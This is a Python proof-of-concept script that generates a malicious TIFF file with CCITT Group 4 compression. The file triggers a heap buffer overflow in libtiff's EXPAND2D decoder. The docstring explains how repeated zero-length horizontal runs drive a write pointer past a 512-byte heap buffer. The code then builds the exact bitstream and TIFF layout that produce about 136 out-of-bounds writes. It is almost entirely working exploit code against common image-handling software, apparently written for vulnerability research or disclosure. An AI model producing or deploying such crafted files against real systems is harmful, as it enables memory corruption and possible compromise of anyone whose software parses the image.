#!/usr/bin/env python3
"""
PoC generator for libtiff VULN 001:
  Heap Buffer Overflow via Unbounded pa Write in EXPAND2D (G3-2D/G4 Decoder)

Target: EXPAND2D macro in tif_fax3.h, called from Fax4Decode() and Fax3Decode2D()
CWE: CWE-122 (Heap-based Buffer Overflow)
Compression: CCITTFAX4 (Group 4 / T.6)

How the overflow works:
  - Fax3SetupState allocates dsp->runs = 128 uint32 slots
    (for rowpixels=32: nruns = TIFFroundup(32,32)*2 = 64; malloc(64*2*4) = 512 bytes)
  - curruns uses slots [0..63], refruns uses slots [64..127]
  - pa starts at curruns = runs[0]
  - Each S_Horiz + white-0-run + black-0-run calls SETVALUE(0) twice:
      *pa++ = RunLength + 0   (a0 stays 0, no advance)
    So pa increases by 2 each iteration while a0 stays at 0
  - while (a0 < lastx) continues (0 < 32 is always true)
  - After 64 iterations: pa = runs[128] -- past end of allocation
  - ASAN catches the out-of-bounds write

EXPAND1D has rollback (pa -= 2 when both last runs are 0), but EXPAND2D does not.

Bit encoding (CCITT G4 / T.6, MSB-first in bitstream):
  S_Horiz code:     001          (3 bits)
  White 0-run MH:   00110101     (8 bits) -- T.4 terminating code for 0 white pixels
  Black 0-run MH:   0000110111   (10 bits) -- T.4 terminating code for 0 black pixels
  Per iteration:    21 bits, pa += 2

  EOFB (End of Facsimile Block): 000000000001 x2 (12 bits each)
"""

import struct
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
OUTPUT_FILE = os.path.join(SCRIPT_DIR, 'vuln_001.tif')

IMAGE_WIDTH      = 32     # Small width: runs buffer = 64 uint32 slots
IMAGE_LENGTH     = 1      # One row
BITS_PER_SAMPLE  = 1
COMPRESSION_G4   = 4      # COMPRESSION_CCITTFAX4
PHOTOMETRIC_W0   = 0      # WhiteIsZero (bilevel)
SAMPLES_PER_PIX  = 1
ROWS_PER_STRIP   = 1
ITERATIONS       = 200    # > 64 needed; 200 gives ~136 OOB writes


def pack_bits(bit_list):
    """Pack a list of 0/1 values into bytes, MSB of each byte holds first bit."""
    bits = list(bit_list)
    while len(bits) % 8 != 0:
        bits.append(0)
    result = bytearray()
    for i in range(0, len(bits), 8):
        byte = 0
        for j in range(8):
            byte = (byte << 1) | bits[i + j]
        result.append(byte)
    return bytes(result)


def build_g4_strip():
    """
    Build CCITT Group 4 (T.6) strip data containing many S_Horiz zero-run pairs.

    Encoding strategy:
      Repeat ITERATIONS times:
        001        = S_Horiz (3 bits, horizontal mode)
        00110101   = White run of 0 pixels (T.4 MH terminating code, 8 bits)
        0000110111 = Black run of 0 pixels (T.4 MH terminating code, 10 bits)
      Then EOFB: 000000000001 000000000001 (two 12-bit sequences)
    """
    # T.4 / G3 terminating codes for run length 0
    S_HORIZ  = [0, 0, 1]
    WHITE_0  = [0, 0, 1, 1, 0, 1, 0, 1]       # 8 bits
    BLACK_0  = [0, 0, 0, 0, 1, 1, 0, 1, 1, 1] # 10 bits
    EOFB     = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1]  # 12 bits

    bits = []
    for _ in range(ITERATIONS):
        bits += S_HORIZ + WHITE_0 + BLACK_0

    # Two EOFB codes to terminate Group 4 stream
    bits += EOFB + EOFB

    return pack_bits(bits)


def build_tiff(strip_data):
    """
    Build a minimal little-endian TIFF file with CCITTFAX4 compression.

    Layout:
      [0..7]   Header: 'II' + magic(42) + IFD offset(8)
      [8..121] IFD:    count(2) + 9 entries(108) + next_ifd(4) = 114 bytes
      [122..]  Strip data
    """
    NUM_TAGS      = 9
    IFD_OFFSET    = 8
    IFD_SIZE      = 2 + NUM_TAGS * 12 + 4       # 2 + 108 + 4 = 114
    STRIP_OFFSET  = IFD_OFFSET + IFD_SIZE         # 122
    STRIP_BYTECOUNT = len(strip_data)

    def tag_short(tag, value):
        """12-byte IFD entry: type=SHORT(3), count=1, value stored in 4-byte field."""
        return struct.pack('<HHII', tag, 3, 1, value)

    def tag_long(tag, value):
        """12-byte IFD entry: type=LONG(4), count=1."""
        return struct.pack('<HHII', tag, 4, 1, value)

    # Header
    header  = b'II'                          # Little-endian byte order
    header += struct.pack('<H', 42)          # TIFF magic
    header += struct.pack('<I', IFD_OFFSET)  # Offset to first IFD

    # IFD (tags must be in ascending tag number order)
    ifd  = struct.pack('<H', NUM_TAGS)
    ifd += tag_long (0x0100, IMAGE_WIDTH)        # ImageWidth
    ifd += tag_long (0x0101, IMAGE_LENGTH)       # ImageLength
    ifd += tag_short(0x0102, BITS_PER_SAMPLE)   # BitsPerSample
    ifd += tag_short(0x0103, COMPRESSION_G4)    # Compression = CCITTFAX4
    ifd += tag_short(0x0106, PHOTOMETRIC_W0)    # PhotometricInterpretation
    ifd += tag_long (0x0111, STRIP_OFFSET)      # StripOffsets
    ifd += tag_short(0x0115, SAMPLES_PER_PIX)  # SamplesPerPixel
    ifd += tag_long (0x0116, ROWS_PER_STRIP)    # RowsPerStrip
    ifd += tag_long (0x0117, STRIP_BYTECOUNT)   # StripByteCounts
    ifd += struct.pack('<I', 0)                  # Next IFD offset = 0 (no more)

    assert len(ifd) == IFD_SIZE, f"IFD size mismatch: {len(ifd)} vs {IFD_SIZE}"

    return header + ifd + strip_data


def main():
    print("[*] Building malicious CCITTFAX4 TIFF (VULN 001 - EXPAND2D overflow)")

    strip_data = build_g4_strip()
    tiff_bytes = build_tiff(strip_data)

    with open(OUTPUT_FILE, 'wb') as f:
        f.write(tiff_bytes)

    total_bits = ITERATIONS * 21 + 24  # 21 bits/iter + 24-bit EOFB
    print(f"[*] Strip data:  {len(strip_data)} bytes ({total_bits} bits of G4 codes)")
    print(f"[*] Total TIFF:  {len(tiff_bytes)} bytes")
    print(f"[*] Iterations:  {ITERATIONS} S_Horiz+White0+Black0 sequences")
    print(f"[*] pa overflow: after 64 iterations pa exits 64-slot curruns buffer")
    print(f"[*] OOB writes:  ~{(ITERATIONS - 64) * 2} uint32 values past end of runs[]")
    print(f"[*] Written to:  {OUTPUT_FILE}")


if __name__ == '__main__':
    main()
